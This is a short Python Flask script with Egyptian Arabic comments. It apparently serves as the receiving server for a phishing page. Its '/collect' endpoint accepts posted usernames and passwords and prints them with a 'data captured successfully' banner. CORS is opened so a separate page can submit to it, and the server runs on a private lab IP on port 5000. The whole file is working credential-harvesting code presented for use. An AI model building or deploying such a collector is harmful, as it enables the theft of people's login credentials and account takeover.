from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # عشان نسمح بالطلبات بين الصفحة والسيرفر بحرية

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    print("\n" + "="*40)
    print("[+] تم التقاط البيانات بنجاح!")
    print(f"[*] اسم المستخدم: {username}")
    print(f"[*] كلمة المرور: {password}")
    print("="*40 + "\n")
    
    return jsonify({"status": "success", "message": "Received"}), 200

if __name__ == '__main__':
    # السيرفر هيشتغل على الآيبي بتاعك اللي ظهر في الكارت والبورت 5000
    app.run(host='192.168.198.131', port=5000, debug=True)
